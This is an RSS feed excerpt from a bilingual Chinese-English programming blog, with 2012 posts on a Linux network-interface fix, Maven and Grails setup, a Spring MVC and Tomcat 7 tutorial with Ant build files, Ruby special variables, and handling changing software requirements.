      <description>&lt;p&gt;今天解决了一个心头大患： 局域网的一个机器总是连不上服务器。最初的时候使用随时分配的地址是没问题的，可是后来弄了固定IP地址之后，就出现了连不上网的问题。&lt;/p&gt;
&lt;p&gt;这个问题在我的AMD SERVER的时候就出现过。现在在我的5200 4GB server上又出现了一次。郁闷！&lt;/p&gt;
&lt;p&gt;经过查看，问题出在 &amp;#160;/etc/network/interfaces 文件中。它的内容是：&lt;br /&gt;auto lo eth1&lt;br /&gt;iface lo inet loopback&lt;br /&gt;eth0 iface eth0 inet dhcp&lt;/p&gt;
&lt;p&gt;看起来没错。可是使用 $ ifconfig -a 查看的话，就会发现: &amp;#160;&lt;br /&gt;eth1 ....&lt;br /&gt;lo ....&lt;/p&gt;
&lt;p&gt;看到了吧？ &amp;#160;一个是eth1, 一个是eth0. &amp;#160;矛盾出来了。所以修改 /etc/network/interfaces 文件，把eth0 改成 eth1 ，就搞定了。&lt;/p&gt;
&lt;p&gt;非常奇怪的问题，可能是因为我的硬盘安装LINUX时是在另外一台机器造成的？ ^_^ 总之问题是比我想象容易的搞定了。。。&lt;/p&gt;</description>
      <pubDate>Sun, 09 Sep 2012 08:04:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/linux-dhcp-client-eth0-or-eth1</link>
    </item>
    <item>
      <title>Maven 5分钟入门 (Maven in 5 minutes )</title>
      <description>&lt;p&gt;最近项目用的JAVA，看着各种版本的jar，我心中特别想念bundler啊。( These days I have been using java for my project, so much I am missing Bundler... ) &lt;/p&gt;
&lt;p&gt;还好java有 Maven&amp;#160; 和 Ivy 进行包管理。（题外话：第一次遇到jar的问题是06年想对jive论坛进行重构——那时候心里的"重构"还不是refactoring 这个概念^_^ ）。 我试着用了Maven。记录如下： （本文也是对&amp;#160; 官方文档 &lt;a target="_blank" title="http://maven.apache.org/guides/getting-started/maven-in-five-minutes.html" href="http://maven.apache.org/guides/getting-started/maven-in-five-minutes.html"&gt;Maven in 5 minutes&lt;/a&gt;的一个小翻译）&lt;br /&gt;(The first time I met the jar dependency problem is in 2006 summer when I am 're-constructing' the famous 'Jive' forum .  for English document, please refer to &lt;a target="_blank" title="http://maven.apache.org/guides/getting-started/maven-in-five-minutes.html" href="http://maven.apache.org/guides/getting-started/maven-in-five-minutes.html"&gt;Maven in 5 minutes&lt;/a&gt; ) &lt;/p&gt;
&lt;p&gt;0. 安装Maven3 (假设你的环境是LINUX): 
&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;下载&lt;a href="http://maven.apache.org/download.html"&gt; Maven3&lt;/a&gt; 并解压缩到本地某个文件夹，&lt;/li&gt;
  &lt;li&gt;设置变量 M2_HOME:  export M2_HOME=/usr/local/apache-maven/apache-maven-3.0.4.&lt;/li&gt;
  &lt;li&gt;设置变量 M2:  export M2=$M2_HOME/bin ，并把它放到PATH中：   export PATH=$M2:$PATH&lt;/li&gt;
  &lt;li&gt;设置变量： export MAVEN_OPTS="-Xms256m -Xmx512m"   &lt;/li&gt;
  &lt;li&gt; 运行 $ mvn --version 查看结果&lt;/li&gt;
&lt;/ol&gt;
为Maven设置代理服务器：   
&lt;ol&gt;
  &lt;li&gt;$ cp $M2_HOME/conf/settings.xml ~/.m2/settings.xml  &lt;/li&gt;
  &lt;li&gt;编辑 这个刚复制过来的settings.xml ， 把你的代理服务器加进去（里面有注释）&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1. 确保你的项目中有个src目录（&lt;a href="http://maven.apache.org/guides/introduction/introduction-to-the-standard-directory-layout.html" target="_blank"&gt;参考MAVEN的标准目录结构&lt;/a&gt;），然后建立 pom.xml 文件：&lt;/p&gt;
&lt;pre&gt;&amp;lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&amp;gt;
  &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;

  &amp;lt;groupId&amp;gt;com.motorola.blur&amp;lt;/groupId&amp;gt;
  &amp;lt;artifactId&amp;gt;new_dashboard_portal&amp;lt;/artifactId&amp;gt;
  &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt;
  &amp;lt;packaging&amp;gt;war&amp;lt;/packaging&amp;gt;

  &amp;lt;name&amp;gt;Maven Quick Start Archetype&amp;lt;/name&amp;gt;
  &amp;lt;url&amp;gt;http://maven.apache.org&amp;lt;/url&amp;gt;

  &amp;lt;dependencies&amp;gt;
    &amp;lt;dependency&amp;gt;
      &amp;lt;groupId&amp;gt;junit&amp;lt;/groupId&amp;gt;
      &amp;lt;artifactId&amp;gt;junit&amp;lt;/artifactId&amp;gt;
      &amp;lt;version&amp;gt;4.8.2&amp;lt;/version&amp;gt;
      &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
    &amp;lt;/dependency&amp;gt;
  &amp;lt;/dependencies&amp;gt;
&amp;lt;/project&amp;gt;&lt;/pre&gt;
&lt;p&gt;2. 输入 $ mvn package , 就会自动的下载需要的JAR，然后打包成 war文件，就可以了（前提是你的文件目录结构是正确的）&lt;/p&gt;
&lt;p&gt;3. 几个最常用的命令：&lt;br /&gt;3.1 compile&lt;br /&gt;3.2 test, integration-test&lt;br /&gt;3.3 package&lt;br /&gt;3.4 deploy&lt;/p&gt;
</description>
      <pubDate>Fri, 07 Sep 2012 01:46:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/maven-in-five-minutes</link>
    </item>
    <item>
      <title>Hibernate基础：annotation (Hibernate basic: annotation)</title>
      <description>&lt;p&gt;使用HIBERNATE，面临一个问题：&amp;#160; pojo, xml , 数据库表，三个东西的内容都是一致的。&lt;br /&gt;最笨的办法： 人肉一个一个去修改。&lt;br /&gt;理想的办法： 修改一个，生成另外2个（我怀念RAILS）。&amp;#160; &lt;/p&gt;
&lt;p&gt;这就要使用 hibernate annotation了。另外的选择还有xdoclet。不过那是几年前的技术了。不谈。&lt;/p&gt;
&lt;p&gt;参考这个文章：http://docs.jboss.org/hibernate/annotations/3.5/reference/en/html_single/#setup-requirements&lt;/p&gt;
</description>
      <pubDate>Thu, 06 Sep 2012 08:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/hibernate-annotation</link>
    </item>
    <item>
      <title>spring MVC基础: 建立一个app应用 (create a spring MVC step by step) for tomcat 7</title>
      <description>&lt;p&gt;
&lt;img src="http://static.springsource.org/docs/Spring-MVC-step-by-step/images/dir-structure-endp1.png" /&gt;
&lt;/p&gt;
&lt;p&gt;( 原文参考：  &lt;a href="http://static.springsource.org/docs/Spring-MVC-step-by-step/part1.html"&gt; Spring MVC step by step &lt;/a&gt; ) &lt;/p&gt;
&lt;p&gt;1. 先建立好文件夹，格式如下：
&lt;/p&gt;
&lt;pre&gt;1. src:  保存所有的 java 文件
2. war:  web相关的文件，以及用于生成部署的文件
&lt;/pre&gt;

&lt;p&gt;2. 在 war 目录下 建立jsp文件 &lt;/p&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;h1&amp;gt;Example - Spring Application&amp;lt;/h1&amp;gt;
    &amp;lt;p&amp;gt;This is my test.&amp;lt;/p&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;
&lt;p&gt;3. 建立 WEB-INF/web.xml文件&lt;/p&gt;
&lt;pre&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&amp;gt;
&amp;lt;web-app version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee 
         http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd" &amp;gt;
  &amp;lt;welcome-file-list&amp;gt;
    &amp;lt;welcome-file&amp;gt;
      index.jsp
    &amp;lt;/welcome-file&amp;gt;
  &amp;lt;/welcome-file-list&amp;gt;
&amp;lt;/web-app&amp;gt;
&lt;/pre&gt;
&lt;p&gt; 4. 建立 build.xml &lt;/p&gt;
&lt;pre class="programlisting"&gt;&amp;lt;?xml version="1.0"?&amp;gt;

&amp;lt;project name="springapp" basedir="." default="usage"&amp;gt;
    &amp;lt;property file="build.properties"/&amp;gt;

    &amp;lt;property name="src.dir" value="src"/&amp;gt;
    &amp;lt;property name="web.dir" value="war"/&amp;gt;
    &amp;lt;property name="build.dir" value="${web.dir}/WEB-INF/classes"/&amp;gt;
    &amp;lt;property name="name" value="springapp"/&amp;gt;

    &amp;lt;path id="master-classpath"&amp;gt;
        &amp;lt;fileset dir="${web.dir}/WEB-INF/lib"&amp;gt;
            &amp;lt;include name="*.jar"/&amp;gt;
        &amp;lt;/fileset&amp;gt;
        &amp;lt;!-- We need the servlet API classes: --&amp;gt;
        &amp;lt;!--  * for Tomcat 5/6 use servlet-api.jar --&amp;gt;
        &amp;lt;!--  * for other app servers - check the docs --&amp;gt;
        &amp;lt;fileset dir="${appserver.lib}"&amp;gt;
            &amp;lt;include name="servlet*.jar"/&amp;gt;
        &amp;lt;/fileset&amp;gt;
        &amp;lt;pathelement path="${build.dir}"/&amp;gt;
    &amp;lt;/path&amp;gt;

    &amp;lt;target name="usage"&amp;gt;
        &amp;lt;echo message=""/&amp;gt;
        &amp;lt;echo message="${name} build file"/&amp;gt;
        &amp;lt;echo message="-----------------------------------"/&amp;gt;
        &amp;lt;echo message=""/&amp;gt;
        &amp;lt;echo message="Available targets are:"/&amp;gt;
        &amp;lt;echo message=""/&amp;gt;
        &amp;lt;echo message="build     --&amp;gt; Build the application"/&amp;gt;
        &amp;lt;echo message="deploy    --&amp;gt; Deploy application as directory"/&amp;gt;
        &amp;lt;echo message="deploywar --&amp;gt; Deploy application as a WAR file"/&amp;gt;
        &amp;lt;echo message="install   --&amp;gt; Install application in Tomcat"/&amp;gt;
        &amp;lt;echo message="reload    --&amp;gt; Reload application in Tomcat"/&amp;gt;
        &amp;lt;echo message="start     --&amp;gt; Start Tomcat application"/&amp;gt;
        &amp;lt;echo message="stop      --&amp;gt; Stop Tomcat application"/&amp;gt;
        &amp;lt;echo message="list      --&amp;gt; List Tomcat applications"/&amp;gt;
        &amp;lt;echo message=""/&amp;gt;
    &amp;lt;/target&amp;gt;

    &amp;lt;target name="build" description="Compile main source tree java files"&amp;gt;
        &amp;lt;mkdir dir="${build.dir}"/&amp;gt;
        &amp;lt;javac destdir="${build.dir}" source="1.5" target="1.5" debug="true"
               deprecation="false" optimize="false" failonerror="true"
               includeantruntime="false"&amp;gt;
            &amp;lt;src path="${src.dir}"/&amp;gt;
            &amp;lt;classpath refid="master-classpath"/&amp;gt;
        &amp;lt;/javac&amp;gt;
    &amp;lt;/target&amp;gt;

    &amp;lt;target name="deploy" depends="build" description="Deploy application"&amp;gt;
        &amp;lt;copy todir="${deploy.path}/${name}" preservelastmodified="true"&amp;gt;
            &amp;lt;fileset dir="${web.dir}"&amp;gt;
                &amp;lt;include name="**/*.*"/&amp;gt;
            &amp;lt;/fileset&amp;gt;
        &amp;lt;/copy&amp;gt;
    &amp;lt;/target&amp;gt;

    &amp;lt;target name="deploywar" depends="build" description="Deploy application as a WAR file"&amp;gt;
        &amp;lt;war destfile="${name}.war"
             webxml="${web.dir}/WEB-INF/web.xml"&amp;gt;
            &amp;lt;fileset dir="${web.dir}"&amp;gt;
                &amp;lt;include name="**/*.*"/&amp;gt;
            &amp;lt;/fileset&amp;gt;
        &amp;lt;/war&amp;gt;
        &amp;lt;copy todir="${deploy.path}" preservelastmodified="true"&amp;gt;
            &amp;lt;fileset dir="."&amp;gt;
                &amp;lt;include name="*.war"/&amp;gt;
            &amp;lt;/fileset&amp;gt;
        &amp;lt;/copy&amp;gt;
    &amp;lt;/target&amp;gt;
    
&lt;em class="lineannotation"&gt;&lt;span class="lineannotation"&gt;&amp;lt;!-- ============================================================== --&amp;gt;&lt;/span&gt;
&lt;/em&gt;
&lt;em class="lineannotation"&gt;&lt;span class="lineannotation"&gt;&amp;lt;!-- Tomcat tasks - remove these if you don't have Tomcat installed --&amp;gt;&lt;/span&gt;
&lt;/em&gt;
&lt;em class="lineannotation"&gt;&lt;span class="lineannotation"&gt;&amp;lt;!-- ============================================================== --&amp;gt;&lt;/span&gt;
&lt;/em&gt;

    &amp;lt;path id="catalina-ant-classpath"&amp;gt;
        &amp;lt;!-- We need the Catalina jars for Tomcat --&amp;gt;
        &amp;lt;!--  * for other app servers - check the docs --&amp;gt;
        &amp;lt;fileset dir="${appserver.lib}"&amp;gt;
            &amp;lt;include name="catalina-ant.jar"/&amp;gt;
        &amp;lt;/fileset&amp;gt;
    &amp;lt;/path&amp;gt;

    &amp;lt;taskdef name="install" classname="org.apache.catalina.ant.InstallTask"&amp;gt;
        &amp;lt;classpath refid="catalina-ant-classpath"/&amp;gt;
    &amp;lt;/taskdef&amp;gt;
    &amp;lt;taskdef name="reload" classname="org.apache.catalina.ant.ReloadTask"&amp;gt;
        &amp;lt;classpath refid="catalina-ant-classpath"/&amp;gt;
    &amp;lt;/taskdef&amp;gt;
    &amp;lt;taskdef name="list" classname="org.apache.catalina.ant.ListTask"&amp;gt;
        &amp;lt;classpath refid="catalina-ant-classpath"/&amp;gt;
    &amp;lt;/taskdef&amp;gt;
    &amp;lt;taskdef name="start" classname="org.apache.catalina.ant.StartTask"&amp;gt;
        &amp;lt;classpath refid="catalina-ant-classpath"/&amp;gt;
    &amp;lt;/taskdef&amp;gt;
    &amp;lt;taskdef name="stop" classname="org.apache.catalina.ant.StopTask"&amp;gt;
        &amp;lt;classpath refid="catalina-ant-classpath"/&amp;gt;
    &amp;lt;/taskdef&amp;gt;

    &amp;lt;target name="install" description="Install application in Tomcat"&amp;gt;
        &amp;lt;install url="${tomcat.manager.url}"
                 username="${tomcat.manager.username}"
                 password="${tomcat.manager.password}"
                 path="/${name}"
                 war="${name}"/&amp;gt;
    &amp;lt;/target&amp;gt;

    &amp;lt;target name="reload" description="Reload application in Tomcat"&amp;gt;
        &amp;lt;reload url="${tomcat.manager.url}"
                 username="${tomcat.manager.username}"
                 password="${tomcat.manager.password}"
                 path="/${name}"/&amp;gt;
    &amp;lt;/target&amp;gt;

    &amp;lt;target name="start" description="Start Tomcat application"&amp;gt;
        &amp;lt;start url="${tomcat.manager.url}"
                 username="${tomcat.manager.username}"
                 password="${tomcat.manager.password}"
                 path="/${name}"/&amp;gt;
    &amp;lt;/target&amp;gt;

    &amp;lt;target name="stop" description="Stop Tomcat application"&amp;gt;
        &amp;lt;stop url="${tomcat.manager.url}"
                 username="${tomcat.manager.username}"
                 password="${tomcat.manager.password}"
                 path="/${name}"/&amp;gt;
    &amp;lt;/target&amp;gt;

    &amp;lt;target name="list" description="List Tomcat applications"&amp;gt;
        &amp;lt;list url="${tomcat.manager.url}"
                 username="${tomcat.manager.username}"
                 password="${tomcat.manager.password}"/&amp;gt;
    &amp;lt;/target&amp;gt;

&lt;em class="lineannotation"&gt;&lt;span class="lineannotation"&gt;&amp;lt;!-- End Tomcat tasks --&amp;gt;&lt;/span&gt;
&lt;/em&gt;

&amp;lt;/project&amp;gt;&lt;/pre&gt;

&lt;p&gt; 5. 建立 build.properties &lt;/p&gt;
&lt;pre&gt;# Ant properties for building the springapp

appserver.home=${user.home}/apache-tomcat-7
# for Tomcat 5 use $appserver.home}/server/lib
# for Tomcat 6 use $appserver.home}/lib
appserver.lib=${appserver.home}/lib

deploy.path=${appserver.home}/webapps
&lt;br /&gt;# this url is very important to tomcat7:  '/text', otherwise it won't work.
tomcat.manager.url=http://localhost:8080/manager/text
tomcat.manager.username=admin
tomcat.manager.password=admin
&lt;/pre&gt;
&lt;p&gt;6. 修改tomcat 配置文件（manager的用户） &lt;/p&gt;
&lt;pre class="programlisting"&gt;&amp;lt;?xml version='1.0' encoding='utf-8'?&amp;gt;
&amp;lt;tomcat-users&amp;gt;
  &amp;lt;role rolename="manager-gui"/&amp;gt;
  &amp;lt;role rolename="manager-script"/&amp;gt;
  &amp;lt;user username="admin" password="admin" roles="manager-gui,manager-script"/&amp;gt;
&amp;lt;/tomcat-users&amp;gt;&lt;/pre&gt;

&lt;p&gt;7. 修改 build.xml ，如果你使用tomcat7的话：&lt;/p&gt;
&lt;pre&gt;  
  &amp;lt;taskdef name="install" classname="org.apache.catalina.ant.DeployTask"&amp;gt;
&lt;/pre&gt;
&lt;p&gt;8. 运行 $ ant ， $ant deploy, $ant list&lt;/p&gt;
&lt;p&gt;9. open:&amp;#160;&amp;#160; http://localhost:8080/springapp&lt;/p&gt;
&lt;p&gt;&lt;img rel="450x450" alt="Springapp" title="Springapp" src="/system/images/BAhbB1sHOgZmIioyMDEyLzA5LzA1LzE2XzMxXzQ4Xzg3Nl9zcHJpbmdhcHAucG5nWwg6BnA6CnRodW1iIg00NTB4NDUwPg/springapp.png" height="327" width="450" /&gt;&lt;/p&gt;
&lt;p&gt;10. 修改web.xml: &lt;/p&gt;
&lt;pre class="programlisting"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&amp;gt;

&amp;lt;web-app version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee 
         http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd" &amp;gt;
&lt;span class="bold"&gt;&lt;strong&gt;
  &amp;lt;servlet&amp;gt;
    &amp;lt;servlet-name&amp;gt;springapp&amp;lt;/servlet-name&amp;gt;
    &amp;lt;servlet-class&amp;gt;org.springframework.web.servlet.DispatcherServlet&amp;lt;/servlet-class&amp;gt;
    &amp;lt;load-on-startup&amp;gt;1&amp;lt;/load-on-startup&amp;gt;
  &amp;lt;/servlet&amp;gt;

  &amp;lt;servlet-mapping&amp;gt;
    &amp;lt;servlet-name&amp;gt;springapp&amp;lt;/servlet-name&amp;gt;
    &amp;lt;url-pattern&amp;gt;*.htm&amp;lt;/url-pattern&amp;gt;
  &amp;lt;/servlet-mapping&amp;gt;
&lt;/strong&gt;
&lt;/span&gt;
  &amp;lt;welcome-file-list&amp;gt;
    &amp;lt;welcome-file&amp;gt;
      index.jsp
    &amp;lt;/welcome-file&amp;gt;
  &amp;lt;/welcome-file-list&amp;gt;

&amp;lt;/web-app&amp;gt;&lt;/pre&gt;
&lt;p&gt; 12. 建立 WEB-INF/springapp-servlet.xml， 注意，这个文件的名字是由上面的 &amp;lt;servlet-name&amp;gt; 中的值决定的。也是一个命名优先规则。&lt;/p&gt;
&lt;pre class="programlisting"&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&amp;gt;

&amp;lt;beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans-2.5.xsd"&amp;gt;
  &lt;em class="lineannotation"&gt;&lt;span class="lineannotation"&gt;&amp;lt;!-- the application context definition for the &lt;tt class="literal"&gt;springapp&lt;/tt&gt; &lt;tt class="classname"&gt;DispatcherServlet&lt;/tt&gt; --&amp;gt;&lt;/span&gt;
&lt;/em&gt;
  &amp;lt;bean name="/hello.htm" class="springapp.web.HelloController"/&amp;gt;
&amp;lt;/beans&amp;gt;&lt;/pre&gt;
&lt;p&gt;13. 把需要用到的lib 文件复制到 WEB-INF/lib下。我把所有的jar文件都复制过来了。。。记得还要有commons-logging.jar, junit-4.10.jar&lt;/p&gt;
&lt;p&gt;14. 建立一个controller &lt;/p&gt;
&lt;pre class="programlisting"&gt;package springapp.web;

import org.springframework.web.servlet.mvc.Controller;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import java.io.IOException;

public class HelloController implements Controller {
    protected final Log logger = LogFactory.getLog(getClass());
    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        logger.info("Returning hello view");
        return new ModelAndView("hello.jsp");
    }
}&lt;/pre&gt;
&lt;p&gt; 15. 建立一个 测试文件： 'springapp/test/springapp/web/HelloControllerTests.java': &lt;/p&gt;
&lt;pre class="programlisting"&gt;package springapp.web;
import org.springframework.web.servlet.ModelAndView;
import springapp.web.HelloController;
import junit.framework.TestCase;
public class HelloControllerTests extends TestCase {
    public void testHandleRequestView() throws Exception{		
        HelloController controller = new HelloController();
        ModelAndView modelAndView = controller.handleRequest(null, null);		
        assertEquals("hello.jsp", modelAndView.getViewName());
    }
}&lt;/pre&gt;
&lt;p&gt; 16. 编辑 build.xml，加入 两个任务： &lt;/p&gt;
&lt;pre class="programlisting"&gt;    &amp;lt;property name="test.dir" value="test"/&amp;gt;
        
    &amp;lt;target name="buildtests" description="Compile test tree java files"&amp;gt;
        &amp;lt;mkdir dir="${build.dir}"/&amp;gt;
        &amp;lt;javac destdir="${build.dir}" source="1.5" target="1.5" debug="true"
            deprecation="false" optimize="false" failonerror="true"
            includeantruntime="false"&amp;gt;
            &amp;lt;src path="${test.dir}"/&amp;gt;
            &amp;lt;classpath refid="master-classpath"/&amp;gt;
        &amp;lt;/javac&amp;gt;
    &amp;lt;/target&amp;gt;
    
    &amp;lt;target name="tests" depends="build, buildtests" description="Run tests"&amp;gt;
        &amp;lt;junit printsummary="on"
            fork="false"
            haltonfailure="false"
            failureproperty="tests.failed"
            showoutput="true"&amp;gt;
            &amp;lt;classpath refid="master-classpath"/&amp;gt;
            &amp;lt;formatter type="brief" usefile="false"/&amp;gt;
            
            &amp;lt;batchtest&amp;gt;
                &amp;lt;fileset dir="${build.dir}"&amp;gt;
                    &amp;lt;include name="**/*Tests.*"/&amp;gt;
                &amp;lt;/fileset&amp;gt;
            &amp;lt;/batchtest&amp;gt;
            
        &amp;lt;/junit&amp;gt;
        
        &amp;lt;fail if="tests.failed"&amp;gt;
            tests.failed=${tests.failed}
            ***********************************************************
            ***********************************************************
            ****  One or more tests failed!  Check the output ...  ****
            ***********************************************************
            ***********************************************************
        &amp;lt;/fail&amp;gt;
    &amp;lt;/target&amp;gt;&lt;/pre&gt;
&lt;p&gt;17. 运行ant tests 命令。&lt;/p&gt;
&lt;pre&gt;sg552@siwei-moto:~/workspace/new_dashboard_portal$ ant tests
Buildfile: /home/sg552/workspace/new_dashboard_portal/build.xml

build:

buildtests:
    [javac] Compiling 1 source file to /home/sg552/workspace/new_dashboard_portal/war/WEB-INF/classes

tests:
    [junit] Running HelloControllerTests
    [junit] Testsuite: HelloControllerTests
    [junit] Tests run: 1, Failures: 0, Errors: 0, Time elapsed: 0.012 sec
    [junit] Tests run: 1, Failures: 0, Errors: 0, Time elapsed: 0.012 sec
    [junit] 

BUILD SUCCESSFUL
Total time: 1 second
&lt;/pre&gt;
&lt;p&gt; 18. 建立 hello.jsp ('springapp/war/hello.jsp') &lt;/p&gt;
&lt;pre class="programlisting"&gt;&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Hello :: Spring Application&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
    &amp;lt;h1&amp;gt;Hello - Spring Application&amp;lt;/h1&amp;gt;
    &amp;lt;p&amp;gt;Greetings.&amp;lt;/p&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/pre&gt;
&lt;p&gt; 19 . 编译，部署 &lt;/p&gt;
&lt;pre&gt;$ ant deploy reload&lt;/pre&gt;
&lt;p&gt; 20 查看 &lt;a href="http://localhost:8080/springapp/hello.htm"&gt;http://localhost:8080/springapp/hello.htm&lt;/a&gt; 结果&lt;/p&gt;
&lt;p&gt;&lt;img rel="450x450" alt="Springapp" title="Springapp" src="/system/images/BAhbB1sHOgZmIioyMDEyLzA5LzA2LzA5XzM4XzQ0Xzg2OF9zcHJpbmdhcHAucG5nWwg6BnA6CnRodW1iIg00NTB4NDUwPg/springapp.png" height="326" width="450" /&gt;&lt;/p&gt;
</description>
      <pubDate>Wed, 05 Sep 2012 07:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/create-spring-mvc-application-step-by-step</link>
    </item>
    <item>
      <title>Ruby中的罕见变量(  rarely seen variables in Ruby)</title>
      <description>&lt;p&gt;今天看到了几个比较罕见的RUBY变量，所以记录下来： ( Today I met the $name variable in Ruby which is rarely seen to me, so I made a memoranda here) 
&lt;/p&gt;
&lt;pre&gt;$,    A global variable, e.g. $codes = [200, 300]
@,  An instance variable, e.g.  @name = "joey"
[a-z] or _, 	A local variable,  e.g. var = 30
[A-Z], A constant, e.g. RED = 'red'
@@	A class variable, e.g. @@action = :say
&lt;/pre&gt;

下面是一些系统定义好的变量： ( below are some predefined variables ) 
&lt;pre&gt;$@ 	The location of latest error
$_ 	The string last read by gets
$. 	The line number last read by interpreter
$&amp;amp; 	The string last matched by regexp
$~ 	The last regexp match, as an array of subexpressions
$n 	The nth subexpression in the last match (same as $~[n])
$= 	The case-insensitivity flag
$/ 	The input record separator
$\ 	The output record separator
$0 	The name of the ruby script file currently executing
$* 	The command line arguments used to invoke the script
$$ 	The Ruby interpreter's process ID
$? 	The exit status of last executed child process
&lt;/pre&gt;
</description>
      <pubDate>Tue, 04 Sep 2012 07:19:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/rarely-seen-variables-in-ruby</link>
    </item>
    <item>
      <title>Grails 基础用法( Grails basics for newbies   )</title>
      <description>&lt;p&gt;1. 安装：&amp;#160; 需要下载JDK， GRAILS等文件并设置以下变量： ( setup:&amp;#160; download related files and set the variables ) &lt;br /&gt;&amp;#160;&amp;#160; 1.1&amp;#160; JAVA_HOME &lt;br /&gt;&amp;#160;&amp;#160; 1.2&amp;#160; GRAILS_HOME&lt;br /&gt;&amp;#160;&amp;#160; 1.3&amp;#160; PATH&lt;/p&gt;
&lt;p&gt;2. 设置代理服务器:&amp;#160;&amp;#160; ( set the proxy ) &lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt;    $ grails add-proxy  –host= –port=
    e.g.   $ grails add-proxy client –host=proxy –port=3128 
    Switching to the setting involves only
    $ grails set-proxy client
    to enable the proxy setting, and
    $ grails clear-proxy
&lt;/pre&gt;


&lt;p&gt;3. 设置代理服务器的第二种方法： ( approach 2. set the proxy) &lt;br /&gt;
&lt;/p&gt;
&lt;pre&gt;/ * EDIT this file:  grails-app/conf/BuildConfig.groovy   */ 
 System.properties.putAll([
   "http.proxyHost": "wwwgate0-ch.mot.com",
   "http.proxyPort": "1080",
 ])&lt;/pre&gt;
&lt;p&gt;4. 运行：&amp;#160; (run with another port)&lt;br /&gt;&amp;#160;$ grails -Dserver.port=8081 run-app&lt;/p&gt;
</description>
      <pubDate>Tue, 04 Sep 2012 02:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/grails-basics</link>
    </item>
    <item>
      <title>需求变更的太快怎么办？(what if the requirement changes too frequently? )</title>
      <description>&lt;p&gt;昨天跟一位朋友讨论问题，谈到了需求变更。他说目前正在遭遇这个情况，变更的太厉害了。2，3天变动一次。需求一变，很多代码都不能用了，包括单元测试代码。而且跑起来一片红。(Yesterday I had a talk with a friend who is suffering the frequent requirements changing. His team has been struggling for this situation that the requirement changes every 2 or 3 days, and every time the change occurs, lots of code including unit tests code doesn't work any more. )&lt;/p&gt;
&lt;p&gt;所以他问我是如何看待这个问题的，以及解决办法是什么。( So he asked me how did I think about this issue and what my solution is. )&lt;/p&gt;
&lt;p&gt;我的回答是： &amp;#160;( My answers are: )&lt;/p&gt;
&lt;p&gt;1. 关于看待这个问题： &amp;#160;需求变动是正常的。Kent说过： 软件开发中唯一不变的就是需求会变化. &amp;#160;很多需求在被（客户或者产品经理）提出的时候，都没有被完善和想好。很多产品都是一点一点的在开发中完善的。如果一个产品，一旦提出需求之后，不允许客户提变动，那么你就是在跟客户博弈，严重的后果就是失去客户。所以，我们要鼓励客户提出合理的需求变更。 &amp;#160;( 1. about how did I think about requirement changes: &amp;#160;it's normal and understandable. &amp;#160;Kent said: &amp;#160;the only thing that doesn't change in software development is : it always changes. &amp;#160;Most of the requirements are not mature and just an idea, the end-user even don't know what they want. Many and many ideas/products becomes full-fledged in the development processing. &amp;#160;If as a team leader, you don't allow end-users change the requirement, you are probably losing your client. So, &amp;#160;reasonable change request should be encouraged. &amp;#160;)&lt;/p&gt;
&lt;p&gt;这里的“合理”指的是： &amp;#160;1. 这个需求是经过深思熟虑的，在逻辑上是行的通，没有前后矛盾的。 &amp;#160;2. 这个需求是可行的。 ( here the 'reasonable' means: 1. this requirement changing is well considered, there's no conflicting there. 2. the new requirement is possible to implemented using current technology) &lt;/p&gt;
&lt;p&gt;2. 解决办法：&amp;#160; ( solutions are: )&lt;br /&gt;&amp;#160; 2.1 新需求是要合理的。&amp;#160; ( the new requirement must be 'reasonable' ) &lt;br /&gt;&amp;#160; 2.2 保持一个开发节奏。例如以一个星期为单位。这个星期内，一旦需求定下来，就不能更改。 ( keep a healthy development rhythm. e.g. make a week as an iteration. once developer starts coding in this week, the requirement could not be changed until the next week comes. )&lt;br /&gt;&amp;#160; 2.3 过时的代码该删就删，不能忍痛留着。无用的代码只会迷惑我们。&amp;#160; ( deprecated code should be always removed, otherwise they will become confusing ) &lt;br /&gt;&amp;#160; 2.4 开发人员的能力至关重要。( the peopleware is the most important. The code written by experienced developer will be always easy to refactor and make changes. )&lt;/p&gt;</description>
      <pubDate>Thu, 30 Aug 2012 02:51:00 +0000</pubDate>
